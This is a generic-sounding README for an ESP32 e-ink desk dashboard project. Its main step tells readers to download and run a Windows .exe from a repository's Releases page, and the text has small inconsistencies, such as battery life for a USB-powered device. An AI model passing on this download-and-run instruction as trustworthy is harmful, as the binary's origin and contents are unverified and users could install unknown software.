# 🖥️ e-ink-desk-dashboard - View your daily tasks on paper

[![](https://img.shields.io/badge/Download-e--ink--desk--dashboard-blue.svg)](https://github.com/Goddartwailful727/e-ink-desk-dashboard)

This project displays your daily productivity data on an e-ink screen. It sends information from your computer to a small device on your desk. The screen looks like paper and stays visible without electricity. You see your calendar, to-do lists, and weather updates at a glance.

## 🚀 How it works

The system uses three main parts to function:

1. A computer program that gathers your data.
2. An internet connection that sends the data.
3. A small device with an e-ink screen that draws the image.

The software runs in the background on your Windows computer. It collects your information and turns it into a simple picture. It then sends that picture to the screen on your desk.

## ⚙️ System requirements

Ensure your computer meets these needs before starting:

* Windows 10 or Windows 11.
* A stable Wi-Fi connection.
* At least 500 megabytes of free space on your hard drive.
* The ESP32 hardware device with a 7.5-inch Waveshare e-paper screen.

## 📥 Download and install

Visit this page to download the software: [https://github.com/Goddartwailful727/e-ink-desk-dashboard](https://github.com/Goddartwailful727/e-ink-desk-dashboard)

Follow these steps to install the system:

1. Go to the link provided above.
2. Select the button labeled "Releases" on the right side of the page.
3. Click the file that ends with .exe to start the download.
4. Save the file to your desktop.
5. Double-click the file to open the installation wizard.
6. Follow the prompts on the screen to finish the setup.
7. Restart your computer if the installer asks you to do so.

## 🔌 Connecting your device

Your e-ink hardware needs to talk to your computer. Follow these steps to pair them:

1. Connect the ESP32 device to a power outlet using a USB cable.
2. Open the e-ink desk dashboard icon on your Windows desktop.
3. Select "Network Settings" from the main menu.
4. Choose your home Wi-Fi name from the list.
5. Enter your Wi-Fi password.
6. Press the "Connect" button.

The screen on your desk should flicker once. This shows that the device received the signal from your computer.

## 📝 Configuring your dashboard

You can choose what information appears on your e-ink screen. Open the dashboard app to change your settings:

* **Calendar:** Toggle this if you want to see your appointments.
* **To-Do List:** This pulls tasks from your digital accounts.
* **Weather:** Choose your city to get local updates.
* **Refresh Rate:** Pick how often the screen updates. A longer time helps the battery last longer.

Press the "Save" button after you change any setting. The changes apply the next time the screen updates.

## 🛠️ Troubleshooting common issues

If you encounter problems, use these steps to fix them:

**The screen is blank.**
Check that the USB cable has power. Verify that your Wi-Fi is active. Press the small button on the back of the ESP32 device to force a refresh.

**The information is outdated.**
Check your internet connection. Make sure the dashboard app is running on your computer. Open the app and verify the Refresh Rate setting.

**The app will not open.**
Remove the app and download it again from the link. Make sure no other programs are currently using the connection port.

**The screen looks blurry.**
Electronic paper screens take time to clear old images. This ghosting is normal. The screen will clear itself over time.

## 🏗️ Hardware setup guide

If you are building your own device, you need these parts:

* ESP32 or ESP32-S3 microcontroller.
* Waveshare 7.5-inch e-paper display.
* A steady 5V power supply.

Connect the wires according to the standard SPI pinout. Ensure your power cables are secure. A loose wire often causes the screen to flash without loading data.

## 📁 Understanding the folder structure

Your installation folder contains several items:

* **logs:** This folder stores notes if an error occurs.
* **config:** This folder keeps your saved settings and Wi-Fi preferences.
* **bin:** This folder contains the main program that runs the display.
* **assets:** This folder includes the images for the interface.

Do not move these files or folders. The program needs them in their original spots to work properly. If you move them, the software will not find your settings.

## 📈 Tips for better performance

Keep your desk tidy to ensure the hardware receives a good signal. Place the screen away from large metal objects that might block the Wi-Fi. If you keep the desk dashboard near your router, the images will update faster.

Update the software once a month. New versions include better ways to communicate with the screen. You can check for updates by opening the app and selecting Help, then About, then Check for Updates.

If you decide to stop using the dashboard, use the "Uninstall" tool in your Windows Settings menu. This removes the temporary files and the program from your system. Unplug your e-ink device from the power outlet afterwards.